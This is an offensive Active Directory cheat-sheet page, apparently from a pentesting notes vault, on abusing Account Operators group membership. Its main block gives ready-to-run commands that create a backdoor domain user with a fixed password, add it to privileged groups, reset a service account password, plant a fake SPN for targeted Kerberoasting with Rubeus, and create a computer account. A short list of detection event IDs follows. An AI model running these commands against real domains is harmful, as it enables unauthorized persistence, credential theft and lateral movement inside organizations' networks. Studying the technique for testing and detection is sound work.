---
title: "Attack #50 — Abusing Account Operators Group"
description: "net user backdoor P@ssword123! /add /domain"
category: active-directory
subcategory: "Privilege & Group Abuse"
tags: ["active-directory", "kerberos", "sql-injection", "pivoting"]
tools: ["Rubeus", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Six/🟣 Attack #50 — Abusing Account Operators Group.md"
---
# 🟣 Attack #50 — Abusing Account Operators Group

***

## 📖 How It Works

**Account Operators** can create, modify, and delete most user and group accounts in the domain (excluding protected admin accounts). They can also log on to Domain Controllers locally. An Account Operator can create a new user and add it to non-protected groups, modify existing service accounts, or reset passwords on non-admin users to pivot deeper.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Membership in Account Operators** | Can manage most domain accounts |

***

## 💻 Full Commands

```powershell
# ── Create new user ───────────────────────────────────────────────────────────
net user backdoor P@ssword123! /add /domain

# ── Add to groups (non-protected) ─────────────────────────────────────────────
net group "SQL Admins" backdoor /add /domain
net group "Remote Desktop Users" backdoor /add /domain
# ⚠️ Cannot add to DA/EA/Schema Admins (protected by AdminSDHolder)

# ── Reset non-admin user passwords ────────────────────────────────────────────
net user svc_backup NewP@ss123! /domain

# ── Modify service accounts (set SPN for Kerberoasting) ──────────────────────
Set-DomainObject -Identity svc_target -Set @{serviceprincipalname='fake/kerbroast'}
.\Rubeus.exe kerberoast /user:svc_target

# ── Create computer account (bypass MAQ) ──────────────────────────────────────
New-ADComputer -Name "FAKE01" -SamAccountName "FAKE01$" -Enabled $true
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4720** | Security Log (DC) | User account created |
| **4728/4732** | Security Log (DC) | User added to group |
| **4724** | Security Log (DC) | Password reset |

***

## 🔗 Attack Chain Context

```
[Account Operators] ──→ Create/modify accounts → pivot deeper
         │
         ├──→ 🔑 Reset service account passwords → access databases/services
         ├──→ 🎫 Set SPNs → targeted Kerberoasting (#2)
         ├──→ 💻 Create computer accounts → RBCD (#17)
         └──→ 💀 Defeated by: minimize Account Operators membership
```

***

> ✅ **Attack #50 — Account Operators complete.**
